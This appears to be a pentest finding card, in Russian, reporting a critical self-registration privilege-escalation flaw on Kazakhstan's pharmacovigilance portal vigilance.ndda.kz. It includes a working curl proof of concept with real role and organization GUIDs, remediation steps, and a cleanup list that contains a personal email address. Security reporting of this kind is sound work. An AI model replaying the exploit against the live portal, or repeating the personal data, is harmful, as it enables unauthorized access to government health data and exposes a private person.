# Finding Card 02 — vigilance.ndda.kz: саморегистрация с самоназначением роли (CRITICAL)

## Title
Анонимная саморегистрация на портале фармаконадзора с клиентским выбором привилегированной роли — vigilance.ndda.kz

## Severity / CVSS
- **Critical (9.3)** — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L`
  (в худшем случае: одобрение без сверки роли → полный доступ к данным фармнадзора)
- CWE-269 Improper Privilege Management + CWE-862 Missing Authorization

## Affected component
- `POST https://vigilance.ndda.kz/api/auth/register` (multipart/form-data, part `user` = JSON, анонимно)
- Роли и их GUID публичны: `GET /api/users/roles` (анонимно)

## Summary
Эндпоинт регистрации создаёт учётку на портале фармаконадзора МЗ РК без аутентификации, при этом `roleId`, `organizationId` и паспортные данные (`idNumber`, документ) берутся из тела запроса и не верифицируются. Злоумышленник регистрируется «Экспертом/Сотрудником отдела фармаконадзор» или «Просмотр всего» от имени произвольной организации.

## PoC (03.09, non-destructive)
```bash
curl -sk -X POST 'https://vigilance.ndda.kz/api/auth/register' \
  -F 'user={"username":"ptestprobe2026x","password":"Pr0beTest!2026","confirmPassword":"Pr0beTest!2026",
      "organizationId":"fa304980-11c9-45a7-8032-0fb48ece85a2",
      "roleId":"49c599ac-eb01-46bb-b4cd-13241819e928",
      "userData":{"firstName":"Пентестов","lastName":"Тестовый","idNumber":"123456789012",
                  "isBoss":false,"documentTypeId":"e0904c7a-…","documentNumber":"123456789012",
                  "hasDocumentNumber":true,"documentStartDate":"2026-01-01","documentEndDate":"2030-01-01"},
      "contacts":[{"typeId":"270f0ed9-…","data":"pt.probe.test@example.com"}]};type=application/json'
# → 200 {"data":"5b153017-4a72-4142-ad67-168a79bffea7","success":true}
```
- Роль «Эксперт/Сотрудник отдела фармаконадзор» → 200, user `5b153017-…`
- Роль «Просмотр всего» → 200, user `1150f6f5-e061-4b7b-90f7-f27a97fabe5b`
- Логин закрыт гейтом «Ожидайте письмо на email» — email контролирует атакующий; если одобрение автоматическое или модератор не сверяет запрошенную роль, роль сохраняется

## Impact
- Учётка с привилегированной ролью на госпортале фармаконадзора самоназначается при регистрации
- После одобрения — доступ к mf_applications/psur (заявки и PSUR-отчёты производителей ЛС)
- Регистрация «сотрудником» произвольной организации (organizationId клиентский)

## Recommendation
1. Убрать `roleId` из модели: роль назначает администратор при одобрении (по умолчанию «Пользователь»)
2. Верификация email до создания записи; сверка organizationId с документами заявителя
3. Одобрение — отдельный workflow с проверкой роли и паспорта

## Артефакты для удаления
vigilance users: `5b153017-4a72-4142-ad67-168a79bffea7` (Эксперт), `1150f6f5-e061-4b7b-90f7-f27a97fabe5b` (Просмотр всего), `6a631ece-87d5-4953-bdb4-fa759aad3a83` (nsmadiysrova_t, Руководитель — по запросу заказчика для end-to-end); emails p.probe.test@example.com, p.probe.test2@example.com, n.smadiysrova@gmail.com
